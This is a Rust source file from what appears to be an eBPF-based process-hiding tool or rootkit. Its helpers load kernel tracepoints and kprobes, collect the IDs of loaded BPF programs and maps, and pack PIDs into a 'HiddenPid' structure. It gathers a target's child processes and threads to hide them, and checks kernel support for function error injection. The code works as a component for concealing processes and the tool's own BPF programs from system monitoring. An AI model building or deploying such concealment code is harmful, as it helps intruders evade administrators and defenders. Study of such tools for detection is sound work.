use std::{
    collections::HashSet,
    fs::{File, OpenOptions},
    io::{BufRead, BufReader, Write},
    path::Path,
    process::Command,
};

use anyhow::{anyhow, Error};
use aya::{
    maps::loaded_maps,
    programs::{loaded_programs, KProbe, ProgramInfo, TracePoint},
    Ebpf, Pod,
};
use caracal_common::MAX_PID_LENGTH;
use flate2::read::GzDecoder;
use log::{debug, info, warn};
use regex::Regex;
use sysinfo::{Pid, Process, System};
#[inline]
pub fn list_active_programs() -> Vec<u32> {
    let mut active_programs = Vec::<u32>::new();
    for prog in loaded_programs().filter_map(Result::ok) {
        active_programs.push(prog.id());
    }
    active_programs
}
#[inline]
pub fn list_active_maps() -> Vec<u32> {
    let mut active_maps = Vec::<u32>::new();
    for map in loaded_maps().filter_map(Result::ok) {
        active_maps.push(map.id());
    }
    active_maps
}

pub fn write_to_tracefs(message: &str, path: &str) -> std::io::Result<()> {
    let tracefs_path = Path::new(path);
    let mut file = OpenOptions::new().write(true).open(tracefs_path)?;
    write!(file, "{message}")?;
    Ok(())
}

pub struct Builder<'a> {
    pub ebpf: &'a mut Ebpf,
    pub tracepoints: Vec<SyscallTracepoint>,
    pub kprobes: Vec<Kprobe>,
}

pub struct Kprobe {
    pub func_name: String,
    pub kfunc_name: String,
}

impl From<(&str, &str)> for Kprobe {
    fn from(v: (&str, &str)) -> Self {
        Self {
            func_name: v.0.into(),
            kfunc_name: v.1.into(),
        }
    }
}

pub struct SyscallTracepoint {
    pub func_name: String,
    pub syscall_name: String,
}
impl From<(&str, &str)> for SyscallTracepoint {
    fn from(v: (&str, &str)) -> Self {
        Self {
            func_name: v.0.into(),
            syscall_name: v.1.into(),
        }
    }
}

impl Builder<'_> {
    pub fn build(&mut self) -> Result<Vec<ProgramInfo>, Error> {
        let mut programs_info = vec![];
        for tp in &self.tracepoints {
            let fname = &tp.func_name;
            let program: &mut TracePoint = self
                .ebpf
                .program_mut(fname)
                .ok_or_else(|| anyhow!("program '{fname}' not found"))?
                .try_into()?;

            program.load()?;
            program.attach("syscalls", &tp.syscall_name)?;
            programs_info.push(program.info()?)
        }
        for kprobe in &self.kprobes {
            let fname = &kprobe.func_name;
            let program: &mut KProbe = self
                .ebpf
                .program_mut(fname)
                .ok_or_else(|| anyhow!("program '{fname}' not found"))?
                .try_into()?;

            program.load()?;
            program.attach(kprobe.kfunc_name.clone(), 0)?;
            programs_info.push(program.info()?)
        }
        Ok(programs_info)
    }
}

#[derive(Clone)]
pub struct BpfProgInfos {
    pub prog_ids: Vec<u32>,
    pub map_ids: Vec<u32>,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct HiddenPid {
    bytes: [u8; MAX_PID_LENGTH as usize],
    len: usize,
}
impl HiddenPid {
    pub fn new(str_repr: &str) -> Self {
        let mut bytes = [0u8; MAX_PID_LENGTH as usize];
        let len = str_repr.len().min(MAX_PID_LENGTH as usize);
        bytes[..len].copy_from_slice(str_repr.as_bytes());
        debug!("{}", unsafe { std::str::from_utf8_unchecked(&bytes) });
        Self { bytes, len }
    }
}
unsafe impl Pod for HiddenPid {}

pub fn fetch_progs_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInfos, Error> {
    let mut prog_ids = vec![];
    let mut map_ids = vec![];
    for pinfo in progs_info {
        prog_ids.push(pinfo.id());
        if let Some(maps) = pinfo.map_ids().unwrap() {
            for mapid in maps {
                map_ids.push(mapid);
            }
        }
    }
    prog_ids.sort();
    let mut map_ids = map_ids
        .into_iter()
        .collect::<HashSet<u32>>()
        .into_iter()
        .collect::<Vec<u32>>();
    map_ids.sort();
    Ok(BpfProgInfos { prog_ids, map_ids })
}

pub fn get_progs_info_from_progs_ids(prog_ids: Vec<u32>) -> Vec<ProgramInfo> {
    let mut prog_info: Vec<ProgramInfo> = vec![];
    for p in loaded_programs().filter_map(Result::ok) {
        if prog_ids.contains(&p.id()) {
            prog_info.push(p)
        }
    }
    prog_info
}

pub fn list_threads(proc: &Process, sys: &System) -> Vec<Pid> {
    let mut threads: Vec<Pid> = vec![];
    if let Some(tasks) = proc.tasks() {
        for pid in tasks {
            if let Some(task) = sys.process(*pid) {
                info!(
                    "  ({}) -> hide child thread ({pid}) [{:?}]",
                    proc.pid(),
                    task.name()
                );
            } else {
                info!("  ({}) -> hide child thread ({pid})", proc.pid());
            }
            threads.push(*pid)
        }
    }
    threads
}
pub fn get_descendants(sys: &System, pid: Pid) -> (Vec<Pid>, Vec<Pid>) {
    let mut descendants_pid: Vec<Pid> = Vec::new();
    let mut queue: Vec<Pid> = vec![pid];

    let mut threads: Vec<Pid> = vec![];
    while let Some(current) = queue.pop() {
        if let Some(proc) = sys.process(current) {
            threads.extend(list_threads(proc, sys))
        } else {
            warn!("pid {current} not found")
        }

        for (child_pid, proc) in sys.processes() {
            if proc.parent() == Some(current) {
                if !threads.contains(&proc.pid()) {
                    descendants_pid.push(*child_pid);
                    if let Some(task) = sys.process(*child_pid) {
                        info!(
                            "({current}) -> hide child process ({child_pid}) [{:?}]",
                            task.name()
                        );
                    } else {
                        info!("({current}) -> hide child process ({child_pid})");
                    }
                }
                queue.push(*child_pid);
            }
        }
    }

    (descendants_pid, threads)
}

fn locate_config_file() -> Result<Box<dyn BufRead>, u8> {
    // Try gzip version
    if let Ok(file) = File::open("/proc/config.gz") {
        let gz = GzDecoder::new(file);
        return Ok(Box::new(BufReader::new(gz)));
    }

    let kernel = String::from_utf8(
        Command::new("uname")
            .arg("-r")
            .output()
            .map_err(|_| 0)?
            .stdout,
    )
    .map_err(|_| 0)?
    .trim()
    .to_string();
    let path = format!("/boot/config-{kernel}");
    if let Ok(file) = File::open(path) {
        return Ok(Box::new(BufReader::new(file)));
    }

    Err(0)
}

pub fn is_function_error_injection_supported() -> Result<bool, u8> {
    let reader: Box<dyn BufRead + 'static> = locate_config_file()?;
    let pattern = Regex::new(r"FUNCTION_ERROR_INJECTION").unwrap();
    for line in reader.lines() {
        let line = line.map_err(|_| 0)?;
        if pattern.is_match(&line) {
            let splits = line.split(r"=");
            if let Some("y") = splits.last() {
                return Ok(true);
            }
        }
    }
    Ok(false)
}
